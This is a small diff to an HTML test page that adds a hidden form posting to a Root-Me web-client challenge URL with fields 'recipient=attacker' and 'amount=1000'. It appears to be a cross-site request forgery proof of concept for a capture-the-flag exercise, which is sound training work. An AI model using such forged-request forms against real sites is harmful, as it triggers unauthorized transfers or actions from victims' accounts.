@@ -6,5 +6,11 @@
 </head>
 <body>
     <h1>TEST</h1>
+    <form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST">
+  <input type="hidden" name="recipient" value="attacker" />
+  <input type="hidden" name="amount" value="1000" />
+</form>
+    <button>send request</button>
 </body>
+<script src="script.js"></script>
 </html>
